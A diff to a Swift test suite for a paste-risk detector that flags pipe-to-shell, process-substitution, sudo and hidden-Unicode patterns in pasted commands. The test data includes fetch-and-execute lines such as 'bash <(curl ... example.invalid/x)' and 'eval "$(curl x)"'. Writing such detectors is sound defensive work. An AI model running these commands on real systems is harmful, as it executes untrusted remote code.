@@ -27,6 +27,15 @@ struct PasteTests {
         for text in ["curl https://example.invalid/x | sh", "wget x |sudo bash", "cat x | /bin/zsh", "x | fish", "x | dash", "x | ksh", "x | sudo -n /bin/sh", "x |\nsh", "x | 'sh'", "x |& tcsh", "x | sudo sh"] {
             #expect(Paste.risks(in: text).contains(.shellPipe), "\(text)")
         }
+        // Process and command substitution feed a shell without a pipe.
+        for text in ["bash <(curl -fsSL https://example.invalid/x)", "source <(x)", ". <(x)",
+            "/bin/sh -c \"$(curl -fsSL https://example.invalid/x)\"", "bash -lc '$(wget -qO- x)'",
+            "eval \"$(curl x)\"", "zsh -c `/usr/bin/curl x`"] {
+            #expect(Paste.risks(in: text).contains(.shellPipe), "\(text)")
+        }
+        for text in ["eval \"$(brew shellenv)\"", "bash -c 'echo $(date)'", "diff <(ls a) <(ls b)", "bash script.sh"] {
+            #expect(!Paste.risks(in: text).contains(.shellPipe), "\(text)")
+        }
         for text in ["sudo ls", "/usr/bin/sudo -u root ls", "echo hi;sudo ls"] {
             #expect(Paste.risks(in: text).contains(.sudo))
         }
@@ -46,6 +55,8 @@ struct PasteTests {
         #expect(Paste.risks(in: "echo safe\u{202E}").contains(.concealed))
         #expect(Paste.risks(in: "echo safe\u{200B}").contains(.concealed))
         #expect(Paste.visiblePreview("safe\u{202E}x") == "safe⟦U+202E⟧x")
+        #expect(Paste.visiblePreview("abcd\u{202E}", limit: 4) == "abcd\n…")
+        #expect(Paste.visiblePreview("abc\u{202E}", limit: 4) == "abc⟦U+202E⟧")
         #expect(Paste.risks(in: "su\u{1B}do ls").contains(.sudo))
     }
 
